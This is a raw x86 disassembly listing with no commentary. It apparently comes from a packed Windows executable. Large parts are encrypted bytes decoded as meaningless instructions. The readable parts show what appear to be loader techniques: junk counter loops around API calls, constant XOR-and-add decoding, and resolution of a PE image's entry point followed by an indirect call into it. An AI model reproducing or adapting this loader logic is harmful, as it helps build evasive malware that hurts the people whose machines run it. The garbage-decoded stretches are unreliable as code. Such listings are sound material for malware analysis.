  40622c:	or     edx,DWORD PTR [esi-0x6d]
  40622f:	lahf   
  406230:	jl     0x406249
  406232:	lds    edx,FWORD PTR [edi+ecx*8]
  406235:	mov    dh,0xc2
  406237:	xor    ebx,DWORD PTR [ebx-0x19e98d5b]
  40623d:	mov    cl,0x9
  40623f:	fisttp DWORD PTR [di]
  406242:	pop    ecx
  406243:	mov    ds:0xf79c49d3,al
  406248:	std    
  406249:	adc    BYTE PTR ds:0x118d81c1,ah
  40624f:	or     ch,BYTE PTR [edx]
  406251:	outs   dx,BYTE PTR ds:[esi]
  406252:	lods   al,BYTE PTR ds:[esi]
  406253:	jmp    0xddc74817
  406258:	dec    eax
  406259:	add    BYTE PTR cs:[ecx+0x168ba40],bh
  406260:	retf   
  406261:	fwait
  406262:	das    
  406263:	lods   al,BYTE PTR ds:[esi]
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	mov    bh,0x15
  406313:	mov    edx,0x7e3f5408
  406318:	jle    0x406346
  40631a:	jge    0x40639a
  40631c:	jle    0x406325
  40631e:	call   0xb68a:0xe8e60f9
  406325:	(bad)
  406329:	shr    BYTE PTR [esp+edi*8-0x67],1
  40632d:	aaa    
  40632e:	test   ch,bh
  406330:	lds    ecx,FWORD PTR [edi+0x30b06cec]
  406336:	inc    esi
  406337:	and    edi,DWORD PTR [ebx]
  406339:	call   FWORD PTR [esi+0x77f8a5ac]
  40633f:	lahf   
  406340:	idiv   BYTE PTR [ebp-0x73aa6359]
  406346:	cmp    al,BYTE PTR [edx+0x4c]
  406349:	inc    ebx
  40634a:	sub    DWORD PTR [eax+ecx*8],ecx
  40634d:	adc    cl,BYTE PTR [ebp-0x18]
  406350:	xor    BYTE PTR [ecx+0x6],cl
  406353:	shr    eax,1
  406355:	jb     0x4062fd
  406357:	xor    eax,0x94f8f71c
  40635c:	test   al,0x9b
  40635e:	xchg   DWORD PTR [edx+0x7b8071b],ebp
  406364:	mov    esp,0xf49f9a18
  406369:	add    eax,0xa0258bf2
  40636e:	cld    
  40636f:	push   eax
  406370:	and    bh,BYTE PTR [edi+ecx*8]
  406373:	outs   dx,BYTE PTR ds:[esi]
  406374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406375:	push   edi
  406376:	xchg   ebx,eax
  406377:	rcr    ah,1
  406379:	fcom   DWORD PTR [edx+0x670b4e08]
  40637f:	int3   
  406380:	pop    edi
  406381:	sub    esi,ebp
  406383:	loopne 0x406353
  406385:	vandps xmm4,xmm5,xmm1
  406389:	pop    ecx
  40638a:	jns    0x40636c
  40638c:	aas    
  40638d:	pop    es
  40638e:	(bad)  [edx+edi*1-0xf]
  406392:	daa    
  406393:	xchg   esp,eax
  406394:	or     DWORD PTR [eax],ebx
  406396:	xchg   ecx,eax
  406397:	stos   BYTE PTR es:[edi],al
  406398:	sub    eax,0x79e521af
  40639d:	jne    0x4063ed
  40639f:	shr    BYTE PTR [ecx-0x51],cl
  4063a2:	stc    
  4063a3:	inc    ebp
  4063a4:	mov    edi,0xccceeb18
  4063a9:	mov    edx,0xeed6e8ca
  4063ae:	in     eax,0x8
  4063b0:	xchg   edx,eax
  4063b1:	pop    esi
  4063b2:	xchg   esp,eax
  4063b3:	test   BYTE PTR [ebp-0x7c],dl
  4063b6:	xchg   esp,eax
  4063b7:	and    ch,ah
  4063b9:	lds    eax,FWORD PTR [eax]
  4063bb:	jp     0x406412
  4063bd:	push   eax
  4063be:	lods   eax,DWORD PTR ds:[esi]
  4063bf:	je     0x4063ee
  4063c1:	retf   0xedd2
  4063c4:	inc    ebp
  4063c5:	test   DWORD PTR [ebp+0x9d1715f],edi
  4063cb:	mov    ds,WORD PTR [esi]
  4063cd:	mov    edx,0x6d4784a
  4063d2:	mov    ds:0xdb6836b2,al
  4063d7:	push   esp
  4063d8:	loopne 0x406392
  4063da:	pop    eax
  4063db:	pop    ebp
  4063dc:	add    eax,DWORD PTR [edx+0x13073323]
  4063e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063e3:	push   eax
  4063e4:	jb     0x406448
  4063e6:	in     eax,0x35
  4063e8:	cmp    DWORD PTR ds:0xd0d99eed,ecx
  4063ee:	mov    edx,0x7eb3aa17
  4063f3:	fdivr  DWORD PTR [eax]
  4063f5:	xor    BYTE PTR [ebx+eax*8-0x7e],al
  4063f9:	rol    ah,cl
  4063fb:	jle    0x4063dc
  4063fd:	icebp  
  4063fe:	or     al,0x9d
  406400:	adc    ah,BYTE PTR [esi]
  406402:	outs   dx,BYTE PTR ds:[esi]
  406403:	cli    
  406404:	jl     0x406441
  406406:	lods   eax,DWORD PTR ds:[esi]
  406407:	test   al,0xc0
  406409:	pop    ebp
  40640a:	inc    ebx
  40640b:	es or  al,0xce
  40640e:	push   edx
  40640f:	jne    0x406461
  406411:	add    DWORD PTR [ebx],ebx
  406413:	cmp    eax,DWORD PTR [ebp+0x1f9f8d47]
  406419:	es gs inc esp
  40641c:	bnd jmp 0x4063d1
  40641f:	jg     0x40642c
  406421:	dec    eax
  406422:	in     eax,dx
  406423:	fs jge 0x4063ea
  406426:	sub    BYTE PTR [edx],ah
  406428:	or     DWORD PTR [esi+esi*1+0x266012ac],0x29b78b38
  406433:	mov    al,ds:0xbe4eb19
  406438:	push   esp
  406439:	mov    al,ds:0x950f52e0
  40643e:	sbb    dl,BYTE PTR [esi-0x58631be5]
  406444:	pop    ebp
  406445:	scas   al,BYTE PTR es:[edi]
  406446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406447:	adc    edx,ebp
  406449:	sbb    eax,0x58ecf5f6
  40644e:	stos   DWORD PTR es:[edi],eax
  40644f:	adc    BYTE PTR [ebx+ecx*4-0x315b3b50],dl
  406456:	jecxz  0x4064cf
  406458:	and    cl,bh
  40645a:	out    dx,eax
  40645b:	add    BYTE PTR [edx],0xe4
  40645e:	sub    eax,0x94251d2c
  406463:	clc    
  406464:	das    
  406465:	inc    ecx
  406466:	or     dl,BYTE PTR [ebp-0x73]
  406469:	sub    eax,0x6b1fe1a6
  40646e:	fdiv   QWORD PTR [edi+0x49]
  406471:	sub    BYTE PTR [ecx+0x35c8d63c],dh
  406477:	leave  
  406478:	ins    DWORD PTR es:[edi],dx
  406479:	jbe    0x4064e3
  40647b:	jecxz  0x4063fd
  40647d:	pop    esi
  40647e:	xlat   BYTE PTR ds:[ebx]
  40647f:	das    
  406480:	sub    BYTE PTR [esi+0x433c48a0],al
  406486:	inc    ebx
  406487:	mov    al,cs:0x9cbd0898
  40648d:	sub    ecx,ebx
  40648f:	mov    dh,0x5b
  406491:	cmp    bh,BYTE PTR [ebx]
  406493:	cmp    al,0x92
  406495:	ins    DWORD PTR es:[edi],dx
  406496:	pop    edi
  406497:	retf   
  406498:	cmp    DWORD PTR [ecx-0xb7a40fa],ecx
  40649e:	sub    al,0x32
  4064a0:	jp     0x4064ef
  4064a2:	imul   DWORD PTR ds:0xad2314bf
  4064a8:	pop    ds
  4064a9:	mov    ebp,DWORD PTR [edx-0x6a]
  4064ac:	dec    ebp
  4064ad:	outs   dx,BYTE PTR ds:[esi]
  4064ae:	cmp    al,0xbd
  4064b0:	xor    al,0xa3
  4064b2:	and    ecx,eax
  4064b4:	jno    0x4064c5
  4064b6:	xchg   ecx,eax
  4064b7:	pop    eax
  4064b8:	out    dx,al
  4064b9:	and    ebp,DWORD PTR [edi-0x12]
  4064bc:	fs cdq 
  4064be:	ficom  WORD PTR [ebp-0x2225df0c]
  4064c4:	push   edi
  4064c5:	imul   ecx,DWORD PTR [edi+0x18b5ed50],0x1c
  4064cc:	gs scas eax,DWORD PTR es:[edi]
  4064ce:	ins    DWORD PTR es:[edi],dx
  4064cf:	shr    DWORD PTR [ebx-0x27f43cc2],cl
  4064d5:	ins    BYTE PTR es:[edi],dx
  4064d6:	push   es
  4064d7:	les    edi,FWORD PTR [esi+esi*2-0x71]
  4064db:	out    dx,eax
  4064dc:	daa    
  4064dd:	imul   ecx,DWORD PTR [ebp+0x1e],0xffffffc8
  4064e1:	ins    BYTE PTR es:[edi],dx
  4064e2:	xor    edi,DWORD PTR ds:0xf002ab38
  4064e8:	inc    esp
  4064e9:	lock and ah,BYTE PTR [ecx-0x4]
  4064ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ee:	mov    bl,0x6b
  4064f0:	xor    ebp,0x6eaef206
  4064f6:	jne    0x4064a0
  4064f8:	mov    al,ds:0x9262e690
  4064fd:	adc    edi,DWORD PTR [edi]
  4064ff:	and    esi,DWORD PTR gs:[ebx+0x61]
  406503:	mov    bl,0x6c
  406505:	fisubr DWORD PTR ds:0x78c85259
  40650b:	xchg   ebp,eax
  40650c:	(bad)  
  40650d:	fidivr WORD PTR [ecx+0x18]
  406510:	push   ebx
  406511:	fcompp 
  406513:	imul   esi,DWORD PTR [ebp-0x3b],0xaa514b21
  40651a:	std    
  40651b:	ja     0x406555
  40651d:	xor    esi,DWORD PTR ds:0x2d68f2a7
  406523:	mov    edx,0xe7ee48f3
  406528:	outs   dx,BYTE PTR ds:[esi]
  406529:	adc    esp,DWORD PTR [edi-0x2d2354df]
  40652f:	shr    DWORD PTR [esi],1
  406531:	jl     0x40651d
  406533:	or     al,dh
  406535:	les    edx,FWORD PTR [ecx-0x633c759c]
  40653b:	xchg   esp,eax
  40653c:	call   0xc32c:0x242f19f6
  406543:	adc    eax,0x57ded271
  406548:	jmp    0xd0492e6e
  40654d:	mov    dl,0xd0
  40654f:	push   edi
  406550:	jecxz  0x4064d6
  406552:	call   0xa7c0:0x38f9369a
  406559:	lock fcmovne st,st(2)
  40655c:	push   eax
  40655d:	or     DWORD PTR [ebx+ecx*4-0x28ad1fc],eax
  406564:	int3   
  406565:	jb     0x4065aa
  406567:	inc    esp
  406568:	inc    edx
  406569:	clc    
  40656a:	or     ch,bh
  40656c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40656d:	scas   al,BYTE PTR es:[edi]
  40656e:	cli    
  40656f:	(bad)  
  406570:	pop    ds
  406571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406572:	and    DWORD PTR [edx],esp
  406574:	add    al,0x32
  406576:	inc    esp
  406577:	enter  0x88f2,0x32
  40657b:	inc    edx
  40657c:	lods   eax,DWORD PTR ds:[esi]
  40657d:	int    0xcc
  40657f:	mov    bl,BYTE PTR [eax-0x78]
  406582:	retf   
  406583:	retf   
  406584:	std    
  406585:	loop   0x406606
  406587:	(bad)  
  406588:	outs   dx,BYTE PTR ds:[esi]
  406589:	add    eax,0xb0ddb8a4
  40658e:	push   eax
  40658f:	loope  0x4065fd
  406591:	fsub   QWORD PTR [edx+0x183b0d05]
  406597:	gs popf 
  406599:	and    ch,BYTE PTR [ecx]
  40659b:	sahf   
  40659c:	ja     0x406528
  40659e:	into   
  40659f:	push   ecx
  4065a0:	ficom  DWORD PTR [edx+0x315750f3]
  4065a6:	int3   
  4065a7:	test   al,0x66
  4065a9:	addr16 repz pop ecx
  4065ac:	xor    BYTE PTR [ebx+0x36],bl
  4065af:	jg     0x4065de
  4065b1:	dec    ecx
  4065b2:	jmp    0x824a9f97
  4065b7:	(bad)  
  4065b8:	fwait
  4065b9:	mov    ecx,0xdb14bf6a
  4065bf:	mov    ds:0x4395f941,al
  4065c4:	mov    ecx,0xff05890e
  4065c9:	pushf  
  4065ca:	outs   dx,BYTE PTR ds:[esi]
  4065cb:	pop    ds
  4065cc:	xchg   edx,eax
  4065cd:	push   ds
  4065ce:	push   eax
  4065cf:	hlt    
  4065d0:	sbb    al,0x61
  4065d2:	data16 cmp al,0x68
  4065d5:	mov    bl,0xc9
  4065d7:	cmp    ah,BYTE PTR [ecx-0x329d2da8]
  4065dd:	mov    WORD PTR [ecx+0x1070e95b],cs
  4065e3:	(bad)  
  4065e4:	sbb    BYTE PTR [esi],ch
  4065e6:	jno    0x40664c
  4065e8:	fild   DWORD PTR [edi+0x35]
  4065eb:	and    eax,0xb0e73881
  4065f0:	add    esi,DWORD PTR [edx-0x5a8b9e61]
  4065f6:	jno    0x4065f3
  4065f8:	ror    DWORD PTR [ebp+0x164e3288],1
  4065fe:	das    
  4065ff:	or     BYTE PTR [esi+0x73],0xfa
  406603:	add    BYTE PTR [ebx-0x229c6adb],cl
  406609:	mov    BYTE PTR [edx-0x27],al
  40660c:	pop    edx
  40660d:	ret    0xa1a7
  406610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406611:	pop    ebx
  406612:	or     esp,DWORD PTR [ebp+0x7a]
  406615:	sar    BYTE PTR [ebp+0x71d5d616],0x5e
  40661c:	add    BYTE PTR [ebx+ebx*1-0x6f91a031],cl
  406623:	dec    ecx
  406624:	sbb    eax,0x4455593e
  406629:	sub    edx,DWORD PTR [edi+esi*4+0x29]
  40662d:	fs adc dh,0xe9
  406631:	imul   DWORD PTR es:[eax+0x2c]
  406635:	dec    edx
  406636:	pop    ebx
  406637:	fiadd  DWORD PTR [esi]
  406639:	pop    esi
  40663a:	addr16 loopne 0x4065c3
  40663d:	fdiv   st(1),st
  40663f:	adc    DWORD PTR [esp-0x23f27892],esp
  406646:	sbb    DWORD PTR [edi],0xac87c9b6
  40664c:	push   es
  40664d:	sbb    al,0xa3
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x3407e5f
  406b85:	mov    esi,0x7e7e3b02
  406b8a:	mov    esp,0xaa7e7e7f
  406b8f:	cmp    al,0x33
  406b91:	inc    ecx
  406b92:	lds    ebx,FWORD PTR [edi]
  406b94:	xchg   DWORD PTR [esi+edx*1-0x2c],eax
  406b98:	cmp    dh,bl
  406b9a:	xchg   DWORD PTR [ebp-0x6],esp
  406b9d:	or     al,0x7d
  406b9f:	std    
  406ba0:	pop    ecx
  406ba1:	outs   dx,BYTE PTR ds:[esi]
  406ba2:	mov    edi,cs
  406ba4:	dec    esi
  406ba5:	imul   eax,DWORD PTR ds:0x3ec8f1e9,0x67
  406bac:	mov    BYTE PTR [edi+0x75],ch
  406baf:	ret    
  406bb0:	mov    cs:0x6d8d006,eax
  406bb6:	das    
  406bb7:	push   ebp
  406bb8:	adc    DWORD PTR ds:0x38ede0b4,esp
  406bbe:	frstor [edx+0x546df7fa]
  406bc4:	or     eax,0x4df82e23
  406bc9:	(bad)  
  406bca:	mov    ds:0xce19055c,al
  406bcf:	js     0x406c0e
  406bd1:	jae    0x406c0a
  406bd3:	adc    al,0xd0
  406bd5:	cmc    
  406bd6:	rcr    DWORD PTR [eax+0x3f35764f],0x97
  406bdd:	(bad)  
  406bde:	push   es
  406bdf:	loope  0x406b70
  406be1:	ins    BYTE PTR es:[edi],dx
  406be2:	jno    0x406b90
  406be4:	repnz add eax,0xafcbfb72
  406bea:	mov    BYTE PTR [ecx-0x62b0e109],dl
  406bf0:	in     eax,dx
  406bf1:	mov    esi,esi
  406bf3:	lock mov edi,0x230864ac
